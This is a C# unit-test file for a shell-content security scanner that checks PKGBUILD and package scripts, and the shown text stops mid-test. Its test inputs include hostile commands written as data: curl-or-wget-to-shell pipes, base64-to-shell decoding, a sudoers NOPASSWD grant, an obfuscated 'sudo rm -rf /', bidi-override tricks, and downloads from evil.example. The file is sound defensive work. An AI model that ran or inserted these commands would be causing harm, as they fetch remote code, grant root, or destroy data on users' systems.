using Atoll.Api.Services.Security;
using Atoll.Api.Services.Security.Scanning;
using Xunit;

namespace Atoll.Api.Tests.Security.Scanning;

public class ShellContentScannerTests
{
    private static List<SecurityFinding> Scan(string content, string path = "PKGBUILD")
    {
        return [.. ShellContentScanner.Scan(content, path)];
    }

    private static SecurityFinding SingleFinding(string content, string ruleId, string path = "PKGBUILD")
    {
        var matches = Scan(content, path).Where(f => string.Equals(f.RuleId, ruleId, StringComparison.Ordinal)).ToList();
        return Assert.Single(matches);
    }

    private static void AssertHasFinding(string content, string ruleId, FindingSeverity severity, string path = "PKGBUILD")
    {
        var findings = Scan(content, path);
        Assert.Contains(findings, f => string.Equals(f.RuleId, ruleId, StringComparison.Ordinal) && f.Severity == severity);
    }

    [Theory]
    [InlineData("curl http://x | sh")]
    [InlineData("wget http://x | sh")]
    [InlineData("wget2 http://x | sh")]
    [InlineData("aria2c http://x | sh")]
    [InlineData("fetch http://x | sh")]
    [InlineData("lynx http://x | sh")]
    [InlineData("httpie http://x | sh")]
    [InlineData("http http://x | sh")]
    public void Scan_NetworkToShellAllKnownDownloaders_FlagsCritical(string content)
    {
        AssertHasFinding(content, "network-to-shell", FindingSeverity.Critical);
    }

    [Theory]
    [InlineData("curl http://x | sh")]
    [InlineData("curl http://x | bash")]
    [InlineData("curl http://x | zsh")]
    [InlineData("curl http://x | dash")]
    [InlineData("curl http://x | ksh")]
    [InlineData("curl http://x | fish")]
    public void Scan_NetworkToShellAllKnownShells_FlagsCritical(string content)
    {
        AssertHasFinding(content, "network-to-shell", FindingSeverity.Critical);
    }

    [Theory]
    [InlineData("echo aGVsbG8= | base64 -d | sh")]
    [InlineData("echo aGVsbG8= | base64 | bash")]
    [InlineData("xxd -r file | sh")]
    public void Scan_DecodeToShellPipedDecoders_FlagsCritical(string content)
    {
        AssertHasFinding(content, "decode-to-shell", FindingSeverity.Critical);
    }

    [Theory]
    [InlineData("eval $(python -c 'import os')")]
    [InlineData("eval `ssh host cmd`")]
    [InlineData("eval base64 -d")]
    // source builtin fed by a download
    [InlineData(". $(curl http://x/cmd)")]
    // echo fed by a download stays critical
    [InlineData("eval echo $(curl http://x/cmd)")]
    public void Scan_EvalIndirectionDynamicCommandExecution_FlagsCritical(string content)
    {
        AssertHasFinding(content, "eval-indirection", FindingSeverity.Critical);
    }

    [Theory]
    [InlineData("eval $(opam env)")]
    [InlineData("eval $(opam env --switch=$pkgname --set-switch)")]
    [InlineData("eval $(makepkg -g --noprepare -do -p $f)")]
    [InlineData("eval $(dbus-launch --sh-syntax)")]
    [InlineData("eval `pifpaf run httpbin --port 64051`")]
    [InlineData("eval $(perl -V:sitearch)")]
    [InlineData("eval $(grep -E '^arch=' PKGBUILD)")]
    [InlineData("eval $(cat /proc/meminfo | awk '/^MemTotal/ {print $2}')")]
    // hardware monitor output feeding local parsers (baraction.sh)
    [InlineData("eval $(sensors 2>/dev/null | sed 's/  */ /g' | awk '{print $1}')")]
    [InlineData("eval $(./get_latest $archs)")]
    [InlineData("eval $(\"${ENVY_BIN}\" session)")]
    [InlineData("eval $(cat cmd)")]
    // source builtin with command substitution
    [InlineData(". $(cat cmd)")]
    // tilde-of-user idiom
    [InlineData("SUDO_HOME=$(eval echo ~$SUDO_USER)")]
    // indirect variable name via eval echo
    [InlineData("_last_modified=$(eval echo \\${_last_modified_${CARCH}})")]
    // echo of a local parser's output
    [InlineData("eval echo -n `grep -oP 'VERSION' CMakeLists.txt`")]
    public void Scan_EvalIndirectionEstablishedIdioms_DowngradesToMedium(string content)
    {
        AssertHasFinding(content, "eval-indirection", FindingSeverity.Medium);
    }

    [Theory]
    // 'source' is part of English display text
    [InlineData("pkgdesc=\"An open source EchoLink proxy for Linux and Windows\"")]
    // keyword after a plain word is an argument mention, not a command
    [InlineData("Description=Open Source EchoLink Proxy")]
    // 'source' inside a printf format string is display text
    [InlineData("printf \"You need to source $(tput setaf 2)/etc/profile$(tput sgr0) to continue\"")]
    // standalone '.' separator between echo arguments
    [InlineData("echo $(grep -oP 'VERSION \\S+' CMakeLists.txt) .r $(git rev-list --count HEAD) . $(git rev-parse --short HEAD)")]
    public void Scan_EvalIndirectionDisplayTextAndArgumentMentions_NotFlagged(string content)
    {
        var findings = Scan(content);
        Assert.False(findings.Exists(f => string.Equals(f.RuleId, "eval-indirection", StringComparison.Ordinal)),
            $"Unexpected eval-indirection finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Scan_EvalIndirectionAfterControlKeyword_StaysCritical()
    {
        // 'then' directly precedes an invoked command: this is a real eval in command position.
        AssertHasFinding("if true; then eval $(python -c 'x'); fi", "eval-indirection", FindingSeverity.Critical);
    }

    [Theory]
    [InlineData("pkgver=$(date +%s)")]
    [InlineData("pkgver=`date +%s`")]
    public void Scan_CommandSubstitutionDollarParenAndBacktick_FlagsMedium(string content)
    {
        AssertHasFinding(content, "command-substitution", FindingSeverity.Medium);
    }

    [Theory]
    [InlineData("cmd=${!target}")]
    public void Scan_VariableIndirectionBashIndirectExpansion_FlagsMedium(string content)
    {
        AssertHasFinding(content, "variable-indirection", FindingSeverity.Medium);
    }

    [Theory]
    // redirect to /etc
    [InlineData("echo x > /etc/passwd")]
    // append to /usr
    [InlineData("echo x >> /usr/bin/foo")]
    // /bin
    [InlineData("echo x > /bin/tool")]
    // /sbin
    [InlineData("echo x > /sbin/tool")]
    // /var
    [InlineData("echo x > /var/log/x")]
    // /root
    [InlineData("echo x > /root/.bashrc")]
    // /opt
    [InlineData("echo x > /opt/x")]
    // /boot
    [InlineData("echo x > /boot/x")]
    // /lib
    [InlineData("echo x > /lib/x")]
    // tee with /etc
    [InlineData("tee /etc/foo")]
    // tee with /home
    [InlineData("tee /home/user/.bashrc")]
    public void Scan_WriteOutsideBuildRootSystemPathWrites_FlagsHigh(string content)
    {
        AssertHasFinding(content, "write-outside-build-root", FindingSeverity.High);
    }

    [Theory]
    // relative path - inside build root
    [InlineData("echo x > ./local")]
    // $pkgdir is inside the build root
    [InlineData("echo x > $pkgdir/foo")]
    public void Scan_WriteOutsideBuildRootRelativeAndPkgdirPaths_NotFlagged(string content)
    {
        var findings = Scan(content);
        Assert.False(findings.Exists(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal)),
            $"Unexpected write-outside-build-root finding. Got: {string.Join(", ", findings.Select(f => f.RuleId))}");
    }

    [Theory]
    [InlineData("curl http://x | python evil.py")]
    [InlineData("curl http://x | perl evil.pl")]
    [InlineData("curl http://x | ruby evil.rb")]
    [InlineData("curl http://x | node evil.js")]
    [InlineData("curl http://x | eval")]
    public void Scan_NetworkExecutionKnownInterpreters_FlagsHigh(string content)
    {
        AssertHasFinding(content, "network-execution", FindingSeverity.High);
    }

    [Theory]
    // uninstall help text in an echo
    [InlineData("echo \"    curl -fsSL https://example.com/uninstall.sh | bash -s -- --purge --yes\"")]
    // displayed command note
    [InlineData("echo \"Script: curl -fsSL https://example.com/install | bash\"")]
    // optdepends-style note in a single-quoted string
    [InlineData("'foo-bin: Foo CLI (alternatively install upstream: curl -fsSL https://example.com/install.sh | sh -s -- -v)'")]
    // usage string containing a literal pipe into 'sh'
    [InlineData("echo \"Usage: $0 {g|sh|ag} [-c|--clear]\"")]
    public void Scan_NetworkRulesQuotedDisplayText_NotFlagged(string content)
    {
        var findings = Scan(content);
        Assert.False(
            findings.Exists(f => f.RuleId.Equals("network-to-shell", StringComparison.Ordinal) ||
                              f.RuleId.Equals("network-execution", StringComparison.Ordinal) ||
                              f.RuleId.Equals("decode-to-shell", StringComparison.Ordinal)),
            $"Unexpected network rule finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Scan_NetworkPipeInsideQuotedCommandSubstitution_StaysCritical()
    {
        // A substitution inside double quotes still executes: only display-text pipes
        // are suppressed.
        AssertHasFinding("echo \"$(curl http://x | sh)\"", "network-to-shell", FindingSeverity.Critical);
    }

    [Theory]
    // release-tag scraping with a -pe line filter
    [InlineData("curl -s https://github.com/org/repo/releases/latest | perl -pe 's!.*/tag/v?([0-9].+)!!'")]
    // HTML scraping with -n and separate -e
    [InlineData("_source=$(curl -s \"$url\" | perl -n -e 's/x/y/ && print')")]
    // switch cluster containing e
    [InlineData("curl http://x | perl -wne 'print if /v/'")]
    public void Scan_NetworkExecutionPerlInlineTextFilters_NotFlagged(string content)
    {
        var findings = Scan(content);
        Assert.False(findings.Exists(f => string.Equals(f.RuleId, "network-execution", StringComparison.Ordinal)),
            $"Unexpected network-execution finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Theory]
    // bare perl executes stdin
    [InlineData("curl http://x | perl")]
    // lone dash reads the program from stdin
    [InlineData("curl http://x | perl -")]
    // module flag provides no program source
    [InlineData("curl http://x | perl -MFile::Spec")]
    // -p without -e or a file still reads stdin
    [InlineData("curl http://x | perl -p")]
    public void Scan_NetworkExecutionPerlWithoutInlineProgram_FlagsHigh(string content)
    {
        AssertHasFinding(content, "network-execution", FindingSeverity.High);
    }

    [Fact]
    public void Scan_ObfuscatedNetworkExecutionIntoPerlFilter_StaysCritical()
    {
        // The perl-filter exemption applies to plainly visible constructs only; hiding the
        // tool names keeps the obfuscation escalation.
        var finding = SingleFinding("c''url http://x | p''erl -pe 's/a/b/'", "network-execution");
        Assert.Equal(FindingSeverity.Critical, finding.Severity);
    }

    [Theory]
    [InlineData("echo yes | bash build_foo --console")]
    [InlineData("echo n | bash ./install.sh --prefix=\"$pkgdir\" > /dev/null")]
    [InlineData("printf '%s\\n' 'yes' ${prefix} | bash \"${srcdir}/installer\" | tee")]
    [InlineData("echo y | sh /opt/installer.sh")]
    public void Scan_DecodeToShellAnswerFeedingIntoLocalScripts_NotFlagged(string content)
    {
        var findings = Scan(content);
        Assert.False(findings.Exists(f => string.Equals(f.RuleId, "decode-to-shell", StringComparison.Ordinal)),
            $"Unexpected decode-to-shell finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Theory]
    // bare shell reads the pipe as its script
    [InlineData("echo 'aGVsbG8=' | bash")]
    // -s reads commands from stdin
    [InlineData("echo x | bash -s -- -y")]
    public void Scan_DecodeToShellStdinExecution_FlagsCritical(string content)
    {
        AssertHasFinding(content, "decode-to-shell", FindingSeverity.Critical);
    }

    [Theory]
    [InlineData("sudo cmd", "sudo")]
    [InlineData("sudoedit /etc/sudoers", "sudoedit")]
    [InlineData("doas cmd", "doas")]
    [InlineData("pkexec cmd", "pkexec")]
    [InlineData("run0 cmd", "run0")]
    [InlineData("su root -c 'evil'", "su")]
    public void Scan_PrivilegeEscalationAllPrivilegeTools_FlagsHigh(string content, string tool)
    {
        var findings = Scan(content);
        var finding = findings.FirstOrDefault(f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal));
        Assert.NotNull(finding);
        Assert.Equal(FindingSeverity.High, finding!.Severity);
        Assert.Contains(tool, finding.Message, StringComparison.Ordinal);
    }

    [Theory]
    // sudo substring but not invoked
    [InlineData("echo pseudo sudoku")]
    // display text in single quotes
    [InlineData("echo 'sudo'")]
    // display text in double quotes
    [InlineData("echo \"sudo is a tool\"")]
    public void Scan_PrivilegeEscalationSubstringAndDisplayMatches_NotFlagged(string content)
    {
        var findings = Scan(content);
        Assert.DoesNotContain(findings, f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal));
    }

    [Theory]
    // cd into a tool
    [InlineData("cd sudo")]
    // sudos-eyes: the packaged file is named sudo
    [InlineData("install -Dm755 sudo \"$pkgdir/usr/lib/sudos-eyes/sudo\"")]
    // word list names the tools it looks for
    [InlineData("for _gsu in pkexec kdesu gksu; do")]
    // the command is echo: the sudo is its argument
    [InlineData("echo sudo sed -i 's/active = no/active = yes/g' /etc/audit/plugins.d/af_unix.conf")]
    // prose in a scriptlet's message
    [InlineData("avahi should be enabled first with: sudo systemctl restart avahi-daemon")]
    // shell-prompt illustration
    [InlineData("echo   $ sudo modprobe libcomposite")]
    public void Scan_PrivilegeEscalationToolNamesInArgumentPosition_NotFlagged(string content)
    {
        var findings = Scan(content);
        Assert.False(findings.Exists(f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal)),
            $"Unexpected privilege-escalation finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Theory]
    // control keyword
    [InlineData("if sudo visudo -c -f /etc/sudoers.d/pyhotspot; then")]
    // elif
    [InlineData("elif sudo -l | grep -qw ALL; then")]
    // case branch body
    [InlineData("3) sudo pacman -S --needed vulkan-nouveau ;;")]
    // exec prefix
    [InlineData("exec pkexec bash -c 'true'")]
    // re-exec guard
    [InlineData("[ $(id -u) -eq 0 ] || exec sudo $0 $@")]
    // piped into sudo's stdin
    [InlineData("gpg -dq ~/.ssh/pass.gpg | sudo -S -v")]
    // modifier past its option and value
    [InlineData("nice -n 10 sudo make install")]
    // env prefix through options and assignments
    [InlineData("env -i FOO=bar sudo make install")]
    // assignment prefix runs the command
    [InlineData("FOO=bar sudo make install")]
    // pipe into sudo
    [InlineData("generate-config | sudo -u dendrite tee /etc/dendrite/config.yaml")]
    // the argument mention is skipped, the live invocation still flags
    [InlineData("cd sudo && sudo make install")]
    public void Scan_PrivilegeEscalationToolsInCommandPosition_FlagsHigh(string content)
    {
        AssertHasFinding(content, "privilege-escalation", FindingSeverity.High);
    }

    [Fact]
    public void Scan_ObfuscatedToolNameInArgumentPosition_EscalatesToCritical()
    {
        // Structural exemptions cover plainly visible constructs only: a hidden tool name is
        // intent evidence wherever it sits.
        var finding = SingleFinding("cd s''u''d''o", "privilege-escalation");

        Assert.Equal(FindingSeverity.Critical, finding.Severity);
        Assert.Contains("obfuscated", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    // function argument names the tool (corpus: 472 packages)
    [InlineData("_install_module curl")]
    // loop variable, not the node runner
    [InlineData("for node in ast.walk(tree):")]
    // prose package list
    [InlineData("base-devel wget curl sudo git tar yajl")]
    public void Scan_ToolRulesWordsInArgumentPosition_NotFlagged(string content)
    {
        var findings = Scan(content);
        Assert.False(
            findings.Exists(f => f.RuleId.Equals("risky-tool", StringComparison.Ordinal) ||
                              f.RuleId.Equals("privilege-escalation", StringComparison.Ordinal)),
            $"Unexpected tool finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Theory]
    // python executes the -m module
    [InlineData("python -m pip install --upgrade pip")]
    // xargs runs what it is handed
    [InlineData("xargs curl --remote-name-all < libraries.txt")]
    // the leading risky tool alone flags the line
    [InlineData("uv pip install --system dist/*.whl")]
    public void Scan_RiskyToolReachedThroughAnotherCommand_FlagsMedium(string content)
    {
        AssertHasFinding(content, "risky-tool", FindingSeverity.Medium);
    }

    [Theory]
    // dependency arrays name tools without invoking them (eddie-ui)
    [InlineData("depends=(mono curl openvpn sudo polkit libnotify libayatana-appindicator)", "PKGBUILD")]
    [InlineData("makedepends=(git curl)", "PKGBUILD")]
    // arch-qualified array
    [InlineData("depends_x86_64=(sudo curl)", "PKGBUILD")]
    [InlineData("optdepends=(sudo)", "PKGBUILD")]
    // obfuscated mention is still just an assigned word
    [InlineData(@"depends=(s\u\do)", "PKGBUILD")]
    // plain shell arrays in helper scripts are data too
    [InlineData("tools=(sudo curl)", "helper.sh")]
    public void Scan_ToolMentionsInsideArrayAssignments_NotFlagged(string content, string path)
    {
        var findings = Scan(content, path);
        Assert.False(
            findings.Exists(f => f.RuleId.Equals("privilege-escalation", StringComparison.Ordinal) ||
                              f.RuleId.Equals("risky-tool", StringComparison.Ordinal)),
            $"Unexpected findings. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Scan_MultiLineArrayValues_DataUntilClosingParen()
    {
        var content = string.Join("\n",
            "depends=(",
            "    mono",
            "    curl",
            "",
            "    sudo",
            ")",
            "build() {",
            "    sudo make install",
            "}");

        var findings = Scan(content);
        var sudo = findings.Where(f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal)).ToList();
        var sudoFinding = Assert.Single(sudo);
        Assert.Equal(FindingSeverity.High, sudoFinding.Severity);
        Assert.Contains("sudo make install", sudoFinding.Snippet, StringComparison.Ordinal);
        Assert.DoesNotContain(findings, f => string.Equals(f.RuleId, "risky-tool", StringComparison.Ordinal) && f.Message.Contains("curl", StringComparison.Ordinal));
    }

    [Fact]
    public void Scan_LiveInvocationAfterArrayDataOnSameLine_FlagsHigh()
    {
        var finding = SingleFinding("depends=(sudo) && sudo make install", "privilege-escalation");
        Assert.Equal(FindingSeverity.High, finding.Severity);
    }

    [Theory]
    [InlineData("depends=($(sudo true))", "privilege-escalation", FindingSeverity.High)]
    [InlineData("depends=($(curl -fsSL https://evil.example/x))", "risky-tool", FindingSeverity.Medium)]
    public void Scan_CommandSubstitutionsInsideArrays_StayLive(string content, string ruleId, FindingSeverity severity)
    {
        AssertHasFinding(content, ruleId, severity);
    }

    [Fact]
    public void Scan_EvalKeywordInsideArrayData_NotFlagged()
    {
        var findings = Scan("depends=(. $(cat deps.txt))");
        Assert.False(findings.Exists(f => string.Equals(f.RuleId, "eval-indirection", StringComparison.Ordinal)),
            $"Unexpected eval-indirection finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Scan_ArrayDataThenObfuscatedInvocation_EscalatesToCritical()
    {
        var finding = SingleFinding("depends=(curl mirror) && c''url https://evil.example", "risky-tool");
        Assert.Equal(FindingSeverity.Critical, finding.Severity);
    }

    [Fact]
    public void Scan_ArrayIntroducerInsideQuotedDisplayText_NotFlagged()
    {
        var findings = Scan("echo \"depends=(sudo)\"");
        Assert.DoesNotContain(findings, f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal));
    }

    [Theory]
    // redundant sudo
    [InlineData("sudo systemctl enable foo.service")]
    // su
    [InlineData("su $user -c 'systemctl --user daemon-reload'")]
    // pkexec
    [InlineData("pkexec modprobe acpi_call")]
    public void Scan_PrivilegeEscalationInInstallScriptlet_DowngradesToMedium(string content)
    {
        // Scriptlets already run as root under alpm's control: the call is redundant,
        // not an escalation.
        var finding = SingleFinding(content, "privilege-escalation", "foo.install");

        Assert.Equal(FindingSeverity.Medium, finding.Severity);
        Assert.Contains("scriptlet", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Scan_ObfuscatedPrivilegeEscalationInInstallScriptlet_DowngradesToMedium()
    {
        // The downgrade is contextual, not syntactic: scriptlets run as root whether or not
        // the tool name is obfuscated.
        var finding = SingleFinding("s''u''d''o rm -rf /", "privilege-escalation", "foo.install");

        Assert.Equal(FindingSeverity.Medium, finding.Severity);
        Assert.Contains("obfuscated", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    // voluntarily-run helper script
    [InlineData("sudo systemctl restart foo.service", "check.sh")]
    // .bash helper script
    [InlineData("sudo apt update", "makedeb.bash")]
    public void Scan_PrivilegeEscalationInHelperScripts_DowngradesToMedium(string content, string path)
    {
        // Helper scripts ship in the package and only run when the user invokes them
        // voluntarily, typically as root: the escalation tool grants nothing the user
        // did not already hand over.
        var finding = SingleFinding(content, "privilege-escalation", path);

        Assert.Equal(FindingSeverity.Medium, finding.Severity);
        Assert.Contains("helper", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Scan_ObfuscatedPrivilegeEscalationInHelperScripts_DowngradesToMedium()
    {
        // The downgrade is contextual, like the scriptlet one: helper scripts run only
        // when invoked voluntarily, obfuscated tool name or not.
        var finding = SingleFinding("s''u''d''o rm -rf /", "privilege-escalation", "check.sh");

        Assert.Equal(FindingSeverity.Medium, finding.Severity);
        Assert.Contains("obfuscated", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Scan_WriteOutsideBuildRootInHelperScripts_StaysHigh()
    {
        // At this layer there is no PKGBUILD to check references against (the
        // reference-aware downgrade lives in PkgBuildSecurityScanner), so system writes
        // (sudoers grants, authorized_keys injection) keep blocking.
        AssertHasFinding("echo 'yay ALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers",
            "write-outside-build-root", FindingSeverity.High, "dockerscript.sh");
    }

    [Theory]
    // build-time invocation
    [InlineData("PKGBUILD")]
    // non-shell helper keeps the finding
    [InlineData("update.py")]
    public void Scan_PrivilegeEscalationOutsideInstallAndHelperScripts_StaysHigh(string path)
    {
        AssertHasFinding("sudo systemctl enable foo.service", "privilege-escalation", FindingSeverity.High, path);
    }

    [Theory]
    [InlineData("npm install x")]
    [InlineData("npx create-app")]
    [InlineData("yarn add x")]
    [InlineData("pnpm install")]
    [InlineData("pip install x")]
    [InlineData("pip3 install x")]
    [InlineData("uv pip install x")]
    [InlineData("poetry install")]
    [InlineData("cargo install x")]
    [InlineData("go install example.com/x@latest")]
    [InlineData("docker run -it x")]
    [InlineData("podman run -it x")]
    [InlineData("kubectl apply -f x")]
    public void Scan_RiskyToolKnownPackageManagersAndRunners_FlagsMedium(string content)
    {
        AssertHasFinding(content, "risky-tool", FindingSeverity.Medium);
    }

    [Fact]
    public void Scan_RiskyToolInsideEchoString_NotFlagged()
    {
        var findings = Scan("echo \"Run: curl http://example.com | sh to install\"");
        // curl|sh is display text inside double quotes - no risky-tool finding for curl.
        Assert.DoesNotContain(findings, f => string.Equals(f.RuleId, "risky-tool", StringComparison.Ordinal) && f.Message.Contains("curl", StringComparison.Ordinal));
    }

    [Fact]
    public void Scan_HiddenCharacterZeroWidth_FlagsMedium()
    {
        // Zero-width chars cannot change shell tokenization, so they are review-only.
        AssertHasFinding("echo rm\u200Brf", "hidden-character", FindingSeverity.Medium);
        // 🏋️ = U+1F3CB U+FE0F U+200D U+2642 U+FE0F - the ZWJ joins the emoji sequence.
        AssertHasFinding("pkgdesc=\"\uD83C\uDFCB\uFE0F\u200D\u2642\uFE0F Training\"", "hidden-character", FindingSeverity.Medium);
    }

    [Fact]
    public void Scan_HiddenCharacterBidiOverride_StaysCritical()
    {
        AssertHasFinding("pkgname=evil\u202Esh", "hidden-character", FindingSeverity.Critical);
    }

    [Fact]
    public void Scan_HiddenCharacterControlCharOutsideQuotes_StaysCritical()
    {
        AssertHasFinding("echo rm\u0001rf", "hidden-character", FindingSeverity.Critical);
    }

    [Fact]
    public void Scan_AnsiEscapeSequences_NotFlagged()
    {
        // Complete CSI sequences are terminal styling - skipped even unquoted.
        var findings = Scan("echo \u001b[96m${blinking:blink=! blink:1}\r\u001b[0m");
        Assert.False(findings.Exists(f => string.Equals(f.RuleId, "hidden-character", StringComparison.Ordinal)),
            $"Unexpected hidden-character finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Scan_ControlCharInsideQuotedDisplayText_NotFlagged()
    {
        var findings = Scan("printf '%s\\n' \"python-poetry: support for Python packages using \u0016Poetry\"");
        Assert.False(findings.Exists(f => string.Equals(f.RuleId, "hidden-character", StringComparison.Ordinal)),
            $"Unexpected hidden-character finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Scan_MojibakeC1Run_NotFlagged()
    {
        // C1 bytes next to Latin-1 supplement characters are double-encoded UTF-8 file names.
        var findings = Scan("mv \"${pkgdir}/target/\"{\u00d1\u0082.cfg,\u0442.cfg}");
        Assert.False(findings.Exists(f => string.Equals(f.RuleId, "hidden-character", StringComparison.Ordinal)),
            $"Unexpected hidden-character finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Scan_BareEscapeInQuotes_StaysCritical()
    {
        // OSC-style escapes (ESC ] … BEL) can spoof the terminal even as echoed data.
        AssertHasFinding("echo \"\u001b]0;evil title\u0007\"", "hidden-character", FindingSeverity.Critical);
    }

    [Fact]
    public void Scan_HiddenCharacterFinding_SnippetIsTrimmedRawLine()
    {
        // The hidden char may appear before a trailing comment; the comment must remain in the snippet.
        var findings = Scan("echo rm\u200Brf # trailing");
        var finding = findings.First(f => string.Equals(f.RuleId, "hidden-character", StringComparison.Ordinal));

        Assert.Equal("echo rm\u200Brf # trailing", finding.Snippet);
    }

    [Fact]
    public void Scan_ObfuscatedPrivilegeEscalation_EscalatesToCritical()
    {
        // sudo is split with empty quotes - invisible to plain grep but visible after de-obfuscation.
        var finding = SingleFinding("s''u''d''o rm -rf /", "privilege-escalation");

        Assert.Equal(FindingSeverity.Critical, finding.Severity);
        Assert.Contains("obfuscated", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Scan_ObfuscatedNetworkToShell_EscalatesToCritical()
    {
        var finding = SingleFinding("c''u''rl https://evil.example/x.sh | s''h", "network-to-shell");

        Assert.Equal(FindingSeverity.Critical, finding.Severity);
    }

    [Fact]
    public void Scan_ObfuscatedNetworkExecution_EscalatesToCritical()
    {
        var finding = SingleFinding("c''url https://evil.example/x | p''ython evil.py", "network-execution");

        Assert.Equal(FindingSeverity.Critical, finding.Severity);
    }

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("pkgname=foo")]
    [InlineData("pkgver=1.0")]
    [InlineData("source=(https://example.com/foo.tar.gz::https://github.com/x/y/archive/v1.0.tar.gz)")]
    public void Scan_BenignContent_NoFindings(string content)
    {
        Assert.Empty(Scan(content));
    }

    [Fact]
    public void Scan_CommentOnlyLine_NoFindings()
    {
        // The comment is stripped before any rule runs, so a malicious-looking construct inside a
        // comment must not be flagged.
        Assert.Empty(Scan("# curl http://x | sh"));
    }

    [Fact]
    public void Scan_HashInsideSingleQuotes_FlagsNetworkToShell()
    {
        // The '#' here is literal text, not a comment - so the curl|sh inside is real and must be flagged.
        var findings = Scan("echo '# ${pkgver}' ; curl http://x | sh");

        Assert.Contains(findings, f => string.Equals(f.RuleId, "network-to-shell", StringComparison.Ordinal));
    }

    [Fact]
    public void Scan_MultipleFindingsOnOneLine_BothRulesEmitted()
    {
        var findings = Scan("sudo curl http://x | sh");

        Assert.Contains("network-to-shell", findings.Select(f => f.RuleId), StringComparer.Ordinal);
        Assert.Contains("privilege-escalation", findings.Select(f => f.RuleId), StringComparer.Ordinal);
    }

    [Fact]
    public void Scan_MultipleLines_SnippetIsOwningLine()
    {
        var findings = Scan("echo hello\nsudo whoami\necho done");

        var sudoFindings = findings.Where(f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal)).ToList();
        var sudoFinding = Assert.Single(sudoFindings);
        Assert.Equal("sudo whoami", sudoFinding.Snippet);
    }

    [Fact]
    public void Scan_CustomPath_PreservedInEachFinding()
    {
        var findings = Scan("sudo whoami", "subdir/foo.install");

        Assert.NotEmpty(findings);
        Assert.All(findings, f => Assert.Equal("subdir/foo.install", f.File));
    }

    [Fact]
    public void Scan_IndentedLine_SnippetIsTrimmed()
    {
        var findings = Scan("   sudo whoami   ");

        Assert.Equal("sudo whoami", findings[0].Snippet);
    }

    [Fact]
    public void Scan_TwoSubstitutionsOnOneLine_SingleCommandSubstitutionFinding()
    {
        // Two $() substitutions on one line should still produce only one command-substitution finding,
        // because the regex finds a single match (the first one) and the rule fires once per match.
        var findings = Scan("a=$(x); b=$(y)");

        var commandSubs = findings.Where(f => string.Equals(f.RuleId, "command-substitution", StringComparison.Ordinal)).ToList();
        Assert.Single(commandSubs);
    }

    [Fact]
    public void Scan_EmptyLines_Skipped()
    {
        var findings = Scan("\n\n   \n\nsudo whoami");

        Assert.True(findings.TrueForAll(f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal)));
        Assert.Single(findings);
    }

    [Theory]
    // single-quoted literal passed to grep
    [InlineData("grep -F '$(build'")]
    // single-quoted display text
    [InlineData("echo 'run $(make)'")]
    // backticks inside single quotes
    [InlineData("echo '`date`'")]
    // single-quoted assignment
    [InlineData("pkgver='$(git describe)'")]
    public void Scan_CommandSubstitutionInsideSingleQuotes_NotFlagged(string content)
    {
        var findings = Scan(content);
        Assert.False(findings.Exists(f => string.Equals(f.RuleId, "command-substitution", StringComparison.Ordinal)),
            $"Unexpected command-substitution finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Theory]
    // double-quoted substitution still executes
    [InlineData("echo \"now: $(date)\"")]
    // backticks inside double quotes still execute
    [InlineData("echo \"`date`\"")]
    // bare substitution
    [InlineData("pkgver=$(date +%s)")]
    public void Scan_CommandSubstitutionOutsideSingleQuotes_FlagsMedium(string content)
    {
        AssertHasFinding(content, "command-substitution", FindingSeverity.Medium);
    }

    [Fact]
    public void Scan_EscapedDollarSubstitution_NotFlagged()
    {
        // \$( never expands - the backslash is load-bearing, e.g. Makefile syntax in sed text.
        var findings = Scan("sed -i s/@X@/\\$(CFLAGS)/ Makefile");

        Assert.False(findings.Exists(f => string.Equals(f.RuleId, "command-substitution", StringComparison.Ordinal)),
            $"Unexpected command-substitution finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Theory]
    // indirect expansion inside single quotes
    [InlineData("echo '${!var}'")]
    public void Scan_VariableIndirectionInsideSingleQuotes_NotFlagged(string content)
    {
        var findings = Scan(content);
        Assert.DoesNotContain(findings, f => string.Equals(f.RuleId, "variable-indirection", StringComparison.Ordinal));
    }

    [Theory]
    // redirect text inside double quotes
    [InlineData("echo \" >> /etc/mkinitcpio.conf.\"")]
    // redirect text inside single quotes
    [InlineData("echo ' > /etc/passwd'")]
    // tee text inside double quotes
    [InlineData("msg2 \"  tee /etc/foo\"")]
